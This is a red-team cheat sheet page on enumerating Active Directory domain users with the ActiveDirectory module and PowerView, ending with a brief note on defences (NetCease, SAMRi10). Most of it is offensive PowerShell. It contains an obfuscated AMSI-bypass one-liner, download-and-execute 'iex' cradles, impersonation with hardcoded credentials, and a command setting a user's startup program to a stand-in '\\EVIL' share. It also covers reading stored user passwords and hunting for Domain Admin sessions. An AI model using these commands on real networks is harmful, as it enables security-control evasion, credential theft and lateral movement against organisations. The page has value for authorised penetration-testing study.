---
title: "Domain Users"
description: "Enumerating domain users."
lead: "Enumerating information about domain users using the ActiveDirectory PowerShell module and PowerView."
date: 2021-11-07T17:55:08+01:00
lastmod: 2021-11-07T17:55:08+01:00
draft: false
images: []
menu: 
  active_directory:
    parent: "domain_enumeration"
weight: 10
toc: true
---

## ActiveDirectory Module

### Setup

```powershell
# If computer has internet access
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory

# If computer has no internet access, download repository
Import-Module .\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose
Import-Module .\ADModule\ActiveDirectory\ActiveDirectory.psd1

# Check if module has been imported correctly
Get-Command -Module ActiveDirectory
```

### Commands

```powershell
# Get list of users in current domain
Get-ADUser -Filter * -Properties *
Get-ADUser -Identity student1 -Properties *
Get-ADUser -Filter * -Properties * | Select Name

# Get list of all properties for users in current domain
Get-ADUser -Filter * -Properties * | Select -First 1 | Get-Member -MemberType *Property | Select Name
Get-ADUser -Filter * -Properties * | Select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}

# Search for a particular string in a user's attributes
Get-ADUser -Filter 'Description -Like "*built*"' -Properties Description | Select name,Description
```

## PowerView

### Setup

```powershell
# If it gets blocked by AMSI we can bypass it with
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

# Then load the module
Import-Module .\PowerView.ps1
. .\PowerView.ps1

# With internet access
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')
```

### Commands

```powershell
# Get list of users in current domain
Get-NetUser
Get-NetUser -Username student1
Get-NetUser | Select cn

# Find all users with an SPN (likely service accounts)
Get-DomainUser -SPN

# Find all service accounts in "Domain Admins"
Get-DomainUser -SPN | ?{$_.memberof -match 'Domain Admins'}

# Check for users who don't have kerberos preauthentication set
Get-DomainUser -PreauthNotRequired
Get-DomainUser -UACFilter DONT_REQ_PREAUTH

# Find users with sidHistory set
Get-DomainUser -LDAPFilter '(sidHistory=*)'

# Find any users with constrained delegation set
Get-DomainUser -TrustedToAuth

# Find all privileged users that aren't marked as sensitive/not for delegation
Get-DomainUser -AllowDelegation -AdminCount

# Get list of all properties for users in current domain
Get-UserProperty
Get-UserProperty -Properties pwdlastset

# Search for a particular string in a user's attributes
Find-UserField -SearchField Description -SearchTerm "built"

# Get actively logged on users on a computer (needs local admin rights on the target)
Get-NetLoggedOn -ComputerName dc.lab.local

# Get actively logged on users on a computer (needs remote registry on the target - started by default on server OS)
Get-LoggedOnLocal -ComputerName dc.lab.local

# Get the last logged user on a computer (needs administrative rights and remote registry on the target)
Get-LastLoggedOn -ComputerName dc.lab.local

# Get all users with passwords changed > 1 year ago, returning sam account names and password last set times
$Date = (Get-Date).AddYears(-1).ToFileTime()
Get-DomainUser -LDAPFilter "(pwdlastset<=$Date)" -Properties samaccountname,pwdlastset

# Get all enabled users, returning distinguishednames
Get-DomainUser -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -Properties distinguishedname
Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname

# Get all disabled users
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=2)"
Get-DomainUser -UACFilter ACCOUNTDISABLE

# Get all users that require smart card authentication
Get-DomainUser -LDAPFilter "(useraccountcontrol:1.2.840.113556.1.4.803:=262144)"
Get-DomainUser -UACFilter SMARTCARD_REQUIRED

# Get all users that *don't* require smart card authentication, only returning sam account names
Get-DomainUser -LDAPFilter "(!useraccountcontrol:1.2.840.113556.1.4.803:=262144)" -Properties samaccountname
Get-DomainUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname

# Use multiple identity types for any *-Domain* function
'S-1-5-21-890171859-3433809279-3366196753-1114', 'CN=dfm,CN=Users,DC=testlab,DC=local','4c435dd7-dc58-4b14-9a5e-1fdb0e80d201','administrator' | Get-DomainUser -Properties samaccountname,lastlogoff

# enumerate all foreign users in the global catalog, and query the specified domain localgroups for their memberships
#   query the global catalog for foreign security principals with domain-based SIDs, and extract out all distinguishednames
$ForeignUsers = Get-DomainObject -Properties objectsid,distinguishedname -SearchBase "GC://testlab.local" -LDAPFilter '(objectclass=foreignSecurityPrincipal)' | ? {$_.objectsid -match '^S-1-5-.*-[1-9]\d{2,}$'} | Select-Object -ExpandProperty distinguishedname
$Domains = @{}
$ForeignMemberships = ForEach($ForeignUser in $ForeignUsers) {
    # extract the domain the foreign user was added to
    $ForeignUserDomain = $ForeignUser.SubString($ForeignUser.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
    # check if we've already enumerated this domain
    if (-not $Domains[$ForeignUserDomain]) {
        $Domains[$ForeignUserDomain] = $True
        # enumerate all domain local groups from the given domain that have membership set with our foreignSecurityPrincipal set
        $Filter = "(|(member=" + $($ForeignUsers -join ")(member=") + "))"
        Get-DomainGroup -Domain $ForeignUserDomain -Scope DomainLocal -LDAPFilter $Filter -Properties distinguishedname,member
    }
}
$ForeignMemberships | fl

# if running in -sta mode, impersonate another credential a la "runas /netonly"
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Invoke-UserImpersonation -Credential $Cred
# ... action
Invoke-RevertToSelf

# Set the specified property for the given user identity
Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose

# Set the owner of 'dfm' in the current domain to 'harmj0y'
Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y

# retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)
Get-ObjectACL "DC=testlab,DC=local" -ResolveGUIDs | ? {
    ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')
}

# check if any user passwords are set
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl
```

### User Hunting

```powershell
# Find all machines on the current domain where the current user has local admin access
# This function queries the DC of the current or provided domain for a list of computers ( Get-NetComputer ) and then use multi-threaded Invoke-CheckLocalAdminAccess on each machine.
# Can also be done using WMI and PowerShell Remoting
# See Find-WMILocalAdminAccess.ps1 and Find-PSRemotingLocalAdminAccess.ps1
Find-LocalAdminAccess -Verbose

# Find local admins on all machines of the domain (needs administrator privs on non-dc machines).
# This function queries the DC of the current or provided domain for a list of computers ( Get-NetComputer ) and then use multi-threaded Get-NetLocalGroup on each machine.
Invoke-EnumerateLocalAdmin -Verbose

# Find computers where a domain admin (or specified user/group) has sessions
# This function queries the DC of the current or provided domain for members of the given group (Domain Admins by default) using Get-NetGroupMember , gets a list of computers ( Get-NetComputer ) and list sessions and logged on users Get-NetSession/Get-NetLoggedon ) from each
Invoke-UserHunter
Invoke-UserHunter -GroupName "RDPUsers"

# To confirm admin access
Invoke-UserHunter -CheckAccess

# Find computers where a domain admin is logged-in.
# This option queries the DC of the current or provided domain for members of the given group (Domain Admins by default) using Get-NetGroupMember , gets a list _only_ of high traffic servers (DC, File Servers and Distributed File servers) for less traffic generation and list sessions and logged on users ( Get-NetSession/Get-NetLoggedon ) from each machine.
Invoke-UserHunter -Stealth

# Find-DomainUserLocation == old Invoke-UserHunter
# enumerate servers that allow unconstrained Kerberos delegation and show all users logged in
Find-DomainUserLocation -ComputerUnconstrained -ShowAll

# hunt for admin users that allow delegation, logged into servers that allow unconstrained delegation
Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation
```

#### Defending against User Hunting

##### NetCease

- Script to change permissions on `NetSessionEnum` method by removing permissions for `Authenticated Users` group
- Fails many of the attacker's session enumeration and hence user hunting capabilities

```powershell
.\NetCease.ps1
```

##### SAMRi10

- From same author as NetCease
- Hardens Windows 10 and Server 2016 against enumeration wihch uses SAMR protocol (like net.exe)
- https://gallery.technet.microsoft.com/SAMRi10-Hardening-Remote-48d94b5b
